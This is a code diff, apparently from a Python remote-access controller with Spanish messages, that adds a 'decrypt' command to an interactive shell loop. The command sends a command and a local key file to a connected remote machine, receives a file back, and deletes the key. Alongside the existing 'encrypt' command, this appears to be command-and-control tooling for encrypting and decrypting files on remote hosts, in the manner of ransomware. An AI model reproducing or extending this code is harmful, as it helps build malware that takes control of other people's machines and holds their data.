@@ -419,6 +419,31 @@ class TCP:
         else:
             print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
 
+    def decrypt(self, cmd):
+        clave = re.findall("-k[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+        if os.path.isfile(clave) and clave.endswith(".key"):
+            print(Fore.MAGENTA + f"Segur@ que quieres usar la clave \"{clave}\"?...\n[S/n] ", end='')
+            res = input()
+            if len(res) == 0 or res.upper() == 'S':
+                key = self.cargarClave(clave)
+                self.__conexion.send(cmd.encode())
+                sleep(0.1)
+                self.__conexion.send(key)
+
+                msg = self.__conexion.recv(1024).decode()
+                if msg[:6] != "error:":
+                    print(Fore.GREEN + f"[+] {self.__addr[0]}: {msg}")
+                    self.recibirArchivo(f"{clave}.dat")
+                    os.remove(f"{clave}")
+
+                else:
+                    print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
+            else:
+                print(Fore.YELLOW + f"[!] Desencriptacion cancelada")
+        else:
+            print(Fore.YELLOW + f"[!] Clave \"{clave}\" no encontrada")
+
     def shell(self):
         try:
             while True:
@@ -548,9 +573,21 @@ class TCP:
                         else:
                             print(Fore.YELLOW + "[!] Falta del parametro key (-k)")
 
-                    except Exception as e:
-                        print(e)
+                    except:
                         print(Fore.RED + "[-] Error de proceso (encrypt)")
+
+                elif cmd.lower()[:7] == "decrypt":
+                    try:
+                        if re.search("-k", cmd):
+                            if re.search("-d", cmd):
+                                self.decrypt(cmd)
+                            else:
+                                print(Fore.YELLOW + f"[!] Falta del parametro decrypt (-d)")
+                        else:
+                            print(Fore.YELLOW + f"[!] Falta del parametro key (-k)")
+
+                    except:
+                        print(Fore.RED + "[-] Error de proceso (decrypt)")
 
                 else:
                     try:
